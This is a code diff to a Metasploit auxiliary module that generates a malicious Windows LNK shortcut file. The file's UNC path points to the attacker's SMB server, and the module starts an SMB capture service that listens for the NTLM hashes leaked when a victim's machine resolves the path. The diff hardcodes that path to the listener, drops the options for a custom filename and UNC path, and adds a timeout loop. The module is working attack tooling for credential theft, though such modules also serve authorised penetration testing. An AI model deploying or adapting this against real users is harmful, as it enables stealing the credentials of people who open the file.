@@ -3,6 +3,8 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
+require 'faker'
+
 class MetasploitModule < Msf::Auxiliary
 
   include Msf::Exploit::FILEFORMAT
@@ -46,8 +48,6 @@ class MetasploitModule < Msf::Auxiliary
     )
 
     register_options([
-      OptString.new('FILENAME', [true, 'The LNK file name', 'msf.lnk']),
-      OptString.new('UNC_PATH', [false, 'The UNC path for credentials capture (e.g., \\\\192.168.1.1\\share)', nil]),
       OptString.new('DESCRIPTION', [false, 'The shortcut description', nil]),
       OptString.new('ICON_PATH', [false, 'The icon path to use', nil]),
       OptInt.new('PADDING_SIZE', [false, 'Size of padding in command arguments', 10]),
@@ -55,17 +55,19 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def run
-    print_status("Creating '#{datastore['FILENAME']}' file...")
-
     lnk_data = create_lnk_file
-    file_create(lnk_data)
-    print_good("LNK file created: #{datastore['FILENAME']}")
+    filename = file_create(lnk_data)
+    print_good("LNK file created: #{filename}")
 
-    if datastore['UNC_PATH']
-      print_status('Set up a listener (e.g., auxiliary/server/capture/smb) to capture the authentication')
-    else
-      start_smb_capture_server
-      print_status("Listening for hashes on #{srvhost}:#{srvport}")
+    start_smb_capture_server
+    print_status("Listening for hashes on #{srvhost}:#{srvport}")
+
+    stime = Time.now.to_f
+    timeout = datastore['ListenerTimeout'].to_i
+    loop do
+      break if timeout > 0 && (stime + timeout < Time.now.to_f)
+
+      Rex::ThreadSafe.sleep(1)
     end
   end
 
@@ -113,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
     data += header
 
     # NAME field (description in Unicode)
-    description = datastore['DESCRIPTION'] || 'Testing Purposes'
+    description = datastore['DESCRIPTION'] || Faker::Lorem.sentence(word_count: 3)
     description_utf16 = description.encode('UTF-16LE').b
     data += [description_utf16.bytesize / 2].pack('v')
     data += description_utf16
@@ -170,21 +172,12 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def get_unc_path
-    if datastore['UNC_PATH']
-      validate_unc_path(datastore['UNC_PATH'])
-    else
-      "\\\\#{srvhost}\\#{Rex::Text.rand_text_alphanumeric(6)}"
-    end
+    "\\\\#{srvhost}\\#{Rex::Text.rand_text_alphanumeric(6)}"
   end
 
   def start_smb_capture_server
     start_service
+    print_status('The SMB service has been started.')
   end
 
-  def validate_unc_path(path)
-    unless path.match(/^\\\\[^\\]+\\[^\\]*$/)
-      print_warning('UNC_PATH may not be correctly formatted. Expected format: \\\\server\\share')
-    end
-    path
-  end
 end
